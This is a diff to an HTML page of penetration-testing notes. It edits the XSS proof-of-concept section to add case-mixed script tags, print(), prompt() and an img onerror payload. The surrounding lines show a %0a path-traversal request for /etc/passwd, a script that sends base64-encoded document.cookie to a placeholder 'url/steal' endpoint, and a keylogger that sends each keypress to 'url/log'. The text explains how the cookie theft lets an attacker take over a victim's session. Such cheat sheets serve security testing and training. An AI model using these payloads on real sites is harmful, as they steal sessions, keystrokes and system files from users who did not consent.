@@ -574,8 +574,12 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	<li> %0a to bypass regex rules:
 		<pre><code>http://vuln.host/some.php?file=%0a../../../../etc/passwd</code></pre>
     <h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
-	    <li> <b> Proof Of Concept (PoC) </b> - <pre><code> <script>alert('Success XSS!');</script> </code></pre>
-	      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
+	    <li> <b>Proof Of Concept (PoC):</b>
+		    <pre><code><scRIPt>alert('Success XSS!');&lt;/sCriPt></code></pre>
+		    <pre><code>print()</code></pre>
+		    <pre><code>prompt()</code></pre>
+		    <pre><code>&lt;img src=x onerror=alert()></code></pre>
+	      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website.
 	    <li> <b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
 	      <p> Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the 		hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
 	    <li> <b> Key Logger </b> - <pre><code> <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script> </code></pre>
